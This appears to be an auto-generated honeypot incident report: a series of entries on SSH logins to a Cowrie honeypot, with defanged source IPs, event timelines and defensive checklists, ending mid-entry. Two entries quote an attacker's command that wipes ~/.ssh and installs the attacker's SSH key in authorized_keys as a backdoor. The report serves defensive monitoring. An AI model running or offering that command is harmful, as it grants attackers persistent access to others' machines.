### 🔴 HIGH · IR-8c7c3205d276

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-11 14:06 |
| **Last Seen** | 2026-07-11 14:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:06:09` | `cowrie.session.connect` |
| `2026-07-11 14:06:09` | `cowrie.client.version` |
| `2026-07-11 14:06:09` | `cowrie.client.kex` |
| `2026-07-11 14:06:10` | `cowrie.login.success` |
| `2026-07-11 14:06:10` | `cowrie.direct-tcpip.request` |
| `2026-07-11 14:06:10` | `cowrie.direct-tcpip.data` |
| `2026-07-11 14:06:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-521607862eb7

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-11 14:06 |
| **Last Seen** | 2026-07-11 14:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:06:53` | `cowrie.session.connect` |
| `2026-07-11 14:06:53` | `cowrie.client.version` |
| `2026-07-11 14:06:53` | `cowrie.client.kex` |
| `2026-07-11 14:06:54` | `cowrie.login.success` |
| `2026-07-11 14:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9411c506b830

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-11 14:06 |
| **Last Seen** | 2026-07-11 14:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:06:53` | `cowrie.session.connect` |
| `2026-07-11 14:06:53` | `cowrie.client.version` |
| `2026-07-11 14:06:53` | `cowrie.client.kex` |
| `2026-07-11 14:06:54` | `cowrie.login.success` |
| `2026-07-11 14:06:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84ae8f319ad0

| Field | Detail |
|---|---|
| **Source IP** | `111.39.167[.]59` |
| **First Seen** | 2026-07-11 14:07 |
| **Last Seen** | 2026-07-11 14:07 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:07:47` | `cowrie.session.connect` |
| `2026-07-11 14:07:48` | `cowrie.client.version` |
| `2026-07-11 14:07:48` | `cowrie.client.kex` |
| `2026-07-11 14:07:53` | `cowrie.login.success` |
| `2026-07-11 14:07:54` | `cowrie.direct-tcpip.request` |
| `2026-07-11 14:07:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.39.167[.]59` to AbuseIPDB if not already reported
- [ ] Block `111.39.167[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7778fe75d8c1

| Field | Detail |
|---|---|
| **Source IP** | `191.36.152[.]28` |
| **First Seen** | 2026-07-11 14:10 |
| **Last Seen** | 2026-07-11 14:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:10:34` | `cowrie.session.connect` |
| `2026-07-11 14:10:35` | `cowrie.client.version` |
| `2026-07-11 14:10:35` | `cowrie.client.kex` |
| `2026-07-11 14:10:38` | `cowrie.login.success` |
| `2026-07-11 14:10:39` | `cowrie.direct-tcpip.request` |
| `2026-07-11 14:10:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.36.152[.]28` to AbuseIPDB if not already reported
- [ ] Block `191.36.152[.]28` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-112759c29a90

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-11 14:10 |
| **Last Seen** | 2026-07-11 14:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:10:42` | `cowrie.session.connect` |
| `2026-07-11 14:10:42` | `cowrie.client.version` |
| `2026-07-11 14:10:42` | `cowrie.client.kex` |
| `2026-07-11 14:10:42` | `cowrie.login.success` |
| `2026-07-11 14:10:42` | `cowrie.direct-tcpip.request` |
| `2026-07-11 14:10:42` | `cowrie.direct-tcpip.data` |
| `2026-07-11 14:10:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90fb9d28fc80

| Field | Detail |
|---|---|
| **Source IP** | `77.106.78[.]215` |
| **First Seen** | 2026-07-11 14:11 |
| **Last Seen** | 2026-07-11 14:11 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:11:19` | `cowrie.session.connect` |
| `2026-07-11 14:11:20` | `cowrie.client.version` |
| `2026-07-11 14:11:20` | `cowrie.client.kex` |
| `2026-07-11 14:11:21` | `cowrie.login.success` |
| `2026-07-11 14:11:22` | `cowrie.direct-tcpip.request` |
| `2026-07-11 14:11:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.106.78[.]215` to AbuseIPDB if not already reported
- [ ] Block `77.106.78[.]215` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a83f7f555e58

| Field | Detail |
|---|---|
| **Source IP** | `60.174.39[.]82` |
| **First Seen** | 2026-07-11 14:11 |
| **Last Seen** | 2026-07-11 14:11 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:11:29` | `cowrie.session.connect` |
| `2026-07-11 14:11:30` | `cowrie.client.version` |
| `2026-07-11 14:11:30` | `cowrie.client.kex` |
| `2026-07-11 14:11:34` | `cowrie.login.success` |
| `2026-07-11 14:11:36` | `cowrie.direct-tcpip.request` |
| `2026-07-11 14:11:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.39[.]82` to AbuseIPDB if not already reported
- [ ] Block `60.174.39[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f46d20797b2

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 14:17 |
| **Last Seen** | 2026-07-11 14:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:17:07` | `cowrie.session.connect` |
| `2026-07-11 14:17:07` | `cowrie.client.version` |
| `2026-07-11 14:17:07` | `cowrie.client.kex` |
| `2026-07-11 14:17:08` | `cowrie.login.success` |
| `2026-07-11 14:17:10` | `cowrie.session.params` |
| `2026-07-11 14:17:10` | `cowrie.command.input` |
| `2026-07-11 14:17:11` | `cowrie.log.closed` |
| `2026-07-11 14:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c6dee5e3c54

| Field | Detail |
|---|---|
| **Source IP** | `197.242.170[.]10` |
| **First Seen** | 2026-07-11 14:21 |
| **Last Seen** | 2026-07-11 14:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:21:13` | `cowrie.session.connect` |
| `2026-07-11 14:21:14` | `cowrie.client.version` |
| `2026-07-11 14:21:14` | `cowrie.client.kex` |
| `2026-07-11 14:21:17` | `cowrie.login.success` |
| `2026-07-11 14:21:18` | `cowrie.direct-tcpip.request` |
| `2026-07-11 14:21:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.242.170[.]10` to AbuseIPDB if not already reported
- [ ] Block `197.242.170[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02555d3464b2

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]59` |
| **First Seen** | 2026-07-11 14:21 |
| **Last Seen** | 2026-07-11 14:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:21:24` | `cowrie.session.connect` |
| `2026-07-11 14:21:24` | `cowrie.client.version` |
| `2026-07-11 14:21:24` | `cowrie.client.kex` |
| `2026-07-11 14:21:26` | `cowrie.login.success` |
| `2026-07-11 14:21:26` | `cowrie.direct-tcpip.request` |
| `2026-07-11 14:21:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]59` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ae8fc10125e

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-11 14:24 |
| **Last Seen** | 2026-07-11 14:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:24:09` | `cowrie.session.connect` |
| `2026-07-11 14:24:09` | `cowrie.client.version` |
| `2026-07-11 14:24:09` | `cowrie.client.kex` |
| `2026-07-11 14:24:09` | `cowrie.login.success` |
| `2026-07-11 14:24:09` | `cowrie.direct-tcpip.request` |
| `2026-07-11 14:24:10` | `cowrie.direct-tcpip.data` |
| `2026-07-11 14:24:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1dd2d01087e

| Field | Detail |
|---|---|
| **Source IP** | `115.241.228[.]34` |
| **First Seen** | 2026-07-11 14:24 |
| **Last Seen** | 2026-07-11 14:25 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:24:51` | `cowrie.session.connect` |
| `2026-07-11 14:24:55` | `cowrie.client.version` |
| `2026-07-11 14:24:55` | `cowrie.client.kex` |
| `2026-07-11 14:24:58` | `cowrie.login.success` |
| `2026-07-11 14:24:59` | `cowrie.direct-tcpip.request` |
| `2026-07-11 14:25:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.228[.]34` to AbuseIPDB if not already reported
- [ ] Block `115.241.228[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-016488a862ab

| Field | Detail |
|---|---|
| **Source IP** | `69.6.222[.]101` |
| **First Seen** | 2026-07-11 14:27 |
| **Last Seen** | 2026-07-11 14:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:27:59` | `cowrie.session.connect` |
| `2026-07-11 14:27:59` | `cowrie.client.version` |
| `2026-07-11 14:27:59` | `cowrie.client.kex` |
| `2026-07-11 14:28:00` | `cowrie.login.success` |
| `2026-07-11 14:28:00` | `cowrie.session.params` |
| `2026-07-11 14:28:00` | `cowrie.command.input` |
| `2026-07-11 14:28:00` | `cowrie.command.failed` |
| `2026-07-11 14:28:01` | `cowrie.log.closed` |
| `2026-07-11 14:28:02` | `cowrie.session.params` |
| `2026-07-11 14:28:02` | `cowrie.command.input` |
| `2026-07-11 14:28:02` | `cowrie.session.file_download` |
| `2026-07-11 14:28:02` | `cowrie.log.closed` |
| `2026-07-11 14:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.222[.]101` to AbuseIPDB if not already reported
- [ ] Block `69.6.222[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b45465bd688d

| Field | Detail |
|---|---|
| **Source IP** | `69.6.222[.]101` |
| **First Seen** | 2026-07-11 14:28 |
| **Last Seen** | 2026-07-11 14:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:28:02` | `cowrie.session.connect` |
| `2026-07-11 14:28:02` | `cowrie.client.version` |
| `2026-07-11 14:28:02` | `cowrie.client.kex` |
| `2026-07-11 14:28:03` | `cowrie.login.success` |
| `2026-07-11 14:28:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.222[.]101` to AbuseIPDB if not already reported
- [ ] Block `69.6.222[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed6393a09514

| Field | Detail |
|---|---|
| **Source IP** | `69.6.222[.]101` |
| **First Seen** | 2026-07-11 14:28 |
| **Last Seen** | 2026-07-11 14:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:28:03` | `cowrie.session.connect` |
| `2026-07-11 14:28:03` | `cowrie.client.version` |
| `2026-07-11 14:28:03` | `cowrie.client.kex` |
| `2026-07-11 14:28:03` | `cowrie.login.success` |
| `2026-07-11 14:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.222[.]101` to AbuseIPDB if not already reported
- [ ] Block `69.6.222[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95e660dbc1e3

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 14:31 |
| **Last Seen** | 2026-07-11 14:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:31:21` | `cowrie.session.connect` |
| `2026-07-11 14:31:21` | `cowrie.client.version` |
| `2026-07-11 14:31:21` | `cowrie.client.kex` |
| `2026-07-11 14:31:22` | `cowrie.login.success` |
| `2026-07-11 14:31:23` | `cowrie.session.params` |
| `2026-07-11 14:31:23` | `cowrie.command.input` |
| `2026-07-11 14:31:23` | `cowrie.log.closed` |
| `2026-07-11 14:31:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-326c179da831

| Field | Detail |
|---|---|
| **Source IP** | `200.115.234[.]24` |
| **First Seen** | 2026-07-11 14:32 |
| **Last Seen** | 2026-07-11 14:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:32:25` | `cowrie.session.connect` |
| `2026-07-11 14:32:25` | `cowrie.client.version` |
| `2026-07-11 14:32:25` | `cowrie.client.kex` |
| `2026-07-11 14:32:26` | `cowrie.login.success` |
| `2026-07-11 14:32:27` | `cowrie.session.params` |
| `2026-07-11 14:32:27` | `cowrie.command.input` |
| `2026-07-11 14:32:27` | `cowrie.command.failed` |
| `2026-07-11 14:32:27` | `cowrie.log.closed` |
| `2026-07-11 14:32:28` | `cowrie.session.params` |
| `2026-07-11 14:32:28` | `cowrie.command.input` |
| `2026-07-11 14:32:28` | `cowrie.session.file_download` |
| `2026-07-11 14:32:28` | `cowrie.log.closed` |
| `2026-07-11 14:32:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.115.234[.]24` to AbuseIPDB if not already reported
- [ ] Block `200.115.234[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0de9b2f4307a

| Field | Detail |
|---|---|
| **Source IP** | `200.115.234[.]24` |
| **First Seen** | 2026-07-11 14:32 |
| **Last Seen** | 2026-07-11 14:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:32:28` | `cowrie.session.connect` |
| `2026-07-11 14:32:28` | `cowrie.client.version` |
| `2026-07-11 14:32:29` | `cowrie.client.kex` |
| `2026-07-11 14:32:29` | `cowrie.login.success` |
| `2026-07-11 14:32:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.115.234[.]24` to AbuseIPDB if not already reported
- [ ] Block `200.115.234[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eda0f0ff162c

| Field | Detail |
|---|---|
| **Source IP** | `200.115.234[.]24` |
| **First Seen** | 2026-07-11 14:32 |
| **Last Seen** | 2026-07-11 14:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:32:30` | `cowrie.session.connect` |
| `2026-07-11 14:32:30` | `cowrie.client.version` |
| `2026-07-11 14:32:30` | `cowrie.client.kex` |
| `2026-07-11 14:32:30` | `cowrie.login.success` |
| `2026-07-11 14:32:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.115.234[.]24` to AbuseIPDB if not already reported
- [ ] Block `200.115.234[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6de8d738b607

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-11 14:36 |
| **Last Seen** | 2026-07-11 14:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:36:25` | `cowrie.session.connect` |
| `2026-07-11 14:36:25` | `cowrie.client.version` |
| `2026-07-11 14:36:25` | `cowrie.client.kex` |
| `2026-07-11 14:36:25` | `cowrie.login.success` |
| `2026-07-11 14:36:25` | `cowrie.direct-tcpip.request` |
| `2026-07-11 14:36:25` | `cowrie.direct-tcpip.data` |
| `2026-07-11 14:36:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a93dbaa7fc98

| Field | Detail |
|---|---|
| **Source IP** | `64.72.74[.]162` |
| **First Seen** | 2026-07-11 14:40 |
| **Last Seen** | 2026-07-11 14:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:40:12` | `cowrie.session.connect` |
| `2026-07-11 14:40:13` | `cowrie.client.version` |
| `2026-07-11 14:40:13` | `cowrie.client.kex` |
| `2026-07-11 14:40:14` | `cowrie.login.success` |
| `2026-07-11 14:40:14` | `cowrie.direct-tcpip.request` |
| `2026-07-11 14:40:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.72.74[.]162` to AbuseIPDB if not already reported
- [ ] Block `64.72.74[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1a52244111f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-11 14:40 |
| **Last Seen** | 2026-07-11 14:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:40:23` | `cowrie.session.connect` |
| `2026-07-11 14:40:23` | `cowrie.client.version` |
| `2026-07-11 14:40:23` | `cowrie.client.kex` |
| `2026-07-11 14:40:23` | `cowrie.login.success` |
| `2026-07-11 14:40:23` | `cowrie.direct-tcpip.request` |
| `2026-07-11 14:40:23` | `cowrie.direct-tcpip.data` |
| `2026-07-11 14:40:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e76c57d77247

| Field | Detail |
|---|---|
| **Source IP** | `125.23.255[.]134` |
| **First Seen** | 2026-07-11 14:40 |
| **Last Seen** | 2026-07-11 14:40 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 14:40:25` | `cowrie.session.connect` |
| `2026-07-11 14:40:26` | `cowrie.client.version` |
| `2026-07-11 14:40:26` | `cowrie.client.kex` |
| `2026-07-11 14:40:30` | `cowrie.login.success` |
| `2026-07-11 14:40:31` | `cowrie.direct-tcpip.request` |
| `2026-07-11 14:40:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.23.255[.]134` to AbuseIPDB if not already reported
- [ ] Block `125.23.255[.]134` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a654c8c8c227

| Field | Detail |
|---|---|
| **Source IP** | `111.68.98[.]152` |
| **First Seen** | 2026-07-11 14:46 |
| **Last Seen** | 2026-07-11 14:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
